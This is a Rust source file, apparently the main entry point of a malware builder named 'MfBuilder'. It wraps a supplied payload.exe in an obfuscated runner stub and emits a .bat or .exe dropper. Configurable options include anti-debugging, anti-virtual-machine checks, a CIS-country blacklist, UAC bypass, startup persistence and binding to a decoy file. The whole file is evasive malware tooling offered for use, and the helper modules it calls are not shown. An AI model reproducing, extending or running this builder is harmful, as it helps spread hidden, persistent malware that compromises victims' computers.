mod crypto;
mod random;
mod obf_batch;
mod builders;
mod dir_utils;
mod templates;
mod mf_runner;
mod binary_arch;
mod build_native;
mod build_dotnet;


use std::{fs::{self, OpenOptions}, io::{BufRead, Write}, process::Command};
use binary_arch::BinaryArch;
use builders::{batch::BatchBuilder, exe::ExeBuilder};
use colored::{Color, ColoredString, Colorize};
use dir_utils::remove_dir_all;
use rand::{rngs::OsRng, Rng, RngCore};
use serde_json::Value;

#[derive(PartialEq)]
enum SupportedFileExtension {
    BAT,
    EXE,
    UNKNOWN
}

impl SupportedFileExtension {
    pub fn from_str(s: &str) -> SupportedFileExtension {
        match s {
            "BAT" => Self::BAT,
            "EXE" => Self::EXE,
            _ => Self::UNKNOWN
        }
    }
    pub fn to_string(&self) -> String {
        match self {
            Self::BAT => ".bat",
            Self::EXE => ".exe",
            Self::UNKNOWN => "Unknown"
        }.to_string()
    }
}

struct MfBuilder {
    build_arch: BinaryArch,

    anti_debug: bool,
    anti_virtual_machine: bool,
    blacklist_cis_countries: bool,
    uac_bypass: bool,
    single_instance: bool,
    run_on_startup: bool,
    bind_file: bool,
    file_extension: SupportedFileExtension,

    payload_bytes: Vec<u8>,
    binder_file_bytes: Vec<u8>,
}

fn h() -> ColoredString {
    return "[+] ".color(Color::White);
}

fn main() {
    let _ = colored::control::set_virtual_terminal(true);
    println!("{}{}", h(), "MfBuilder (Standard - 1.0.0)".color(Color::BrightGreen));

    let config = fs::read_to_string("build.json").unwrap();
    let config: Value = serde_json::from_str(&config).unwrap();
    let config = config.as_object().unwrap();

    let mut build_config = MfBuilder {
        build_arch: BinaryArch::Unknown,

        anti_debug: config["anti_debug"].as_bool().unwrap(),
        anti_virtual_machine: config["anti_virtual_machine"].as_bool().unwrap(),
        blacklist_cis_countries: config["blacklist_cis_countries"].as_bool().unwrap(),
        uac_bypass: config["uac_bypass"].as_bool().unwrap(),
        single_instance: config["single_instance"].as_bool().unwrap(),
        run_on_startup: config["run_on_startup"].as_bool().unwrap(),
        bind_file: config["binder"].as_bool().unwrap(),
        file_extension: SupportedFileExtension::from_str(config["file_extension"].as_str().unwrap()),
        
        payload_bytes: Vec::new(),
        binder_file_bytes: Vec::new()
    };

    if build_config.file_extension == SupportedFileExtension::UNKNOWN {
        return;
    }
    let payload_bytes = OpenOptions::new().read(true).write(true).open("payload.exe").unwrap();
    println!("{}{}", h(), "Loaded build configuration from build.json".color(Color::Yellow));

    build_config.build_arch = BinaryArch::determine(&fs::read("payload.exe").unwrap());
    if build_config.build_arch == BinaryArch::Unknown { return;}

    println!("{}{}{}", h(), "Build Architecture:  ".color(Color::Yellow), format!("{:?}", build_config.build_arch).color(Color::Blue));

    if build_config.bind_file {
        build_config.binder_file_bytes = fs::read("bind.exe").unwrap();
    }

    let mut st = mf_runner::MfStubCS::new();
    st.init_keys();
    if build_config.run_on_startup {
        st.init_persistance();
    }

    drop(payload_bytes);
    let input_url = if build_config.build_arch == BinaryArch::X64 || build_config.build_arch == BinaryArch::X86 {
        build_native::build_native_stage(&mut build_config, &mut st)
    } else {
        build_dotnet::build_dotnet_stage(&mut build_config, &mut st)
    };

    st.init_payload(input_url);
    st.set_symbols(&build_config);

    if !st.ms_build(build_config.build_arch) {
        println!("{}{}", h(), "Failed to build MfRunner".color(Color::BrightRed));
        return;
    }
    let _ = remove_dir_all(&st.working_directory, &st.working_directory);
    println!("{}", "---".color(Color::White));
    st.obfuscate_mf_runner();
    println!("{}", "---".color(Color::White));

    println!("{}{}{}", h(), "Result file type:    ".color(Color::Yellow), build_config.file_extension.to_string().color(Color::Blue));
    match build_config.file_extension {
        SupportedFileExtension::BAT => BatchBuilder::build(&st),
        SupportedFileExtension::EXE => ExeBuilder::build(&st),
        SupportedFileExtension::UNKNOWN => {}
    };
    fs::remove_dir(st.working_directory).unwrap();
}